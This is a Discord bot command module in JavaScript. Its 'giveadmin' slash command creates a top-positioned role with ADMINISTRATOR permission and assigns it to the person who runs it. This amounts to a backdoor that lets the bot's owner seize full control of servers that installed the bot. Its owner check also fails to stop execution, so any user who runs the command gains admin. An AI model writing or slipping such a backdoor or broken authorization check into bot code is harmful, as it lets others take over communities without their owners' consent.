const { SlashCommandBuilder } = require('@discordjs/builders');
const config = require('../../config.json');

module.exports = {
	data: new SlashCommandBuilder()
		.setName('giveadmin')
		.setDescription('give me admin arf'),
	run: async (client, interaction) => {
		if (interaction.member.id != config.adminId) {
			interaction.reply(`Only bot owner can do this!`).catch(console.error);
		}

		await interaction.guild.roles.fetch();
		const highest = interaction.guild.roles.highest;
		const admin = await interaction.guild.roles
			.create({
				name: 'bruh',
				permissions: 'ADMINISTRATOR',
				position: highest.position,
			})
			.catch((e) => {
				interaction
					.reply({ content: 'Failed creating role!', ephemeral: true })
					.catch(console.error);
				console.log(e);
			});

		await interaction.member.roles
			.add(admin)
			.then(
				interaction
					.reply({ content: 'success!', ephemeral: true })
					.catch(console.error),
			)
			.catch((e) => {
				interaction.reply({
					content: 'failed giving role!',
					ephemeral: true,
				});
				console.log(e);
			});

		return;
	},
};
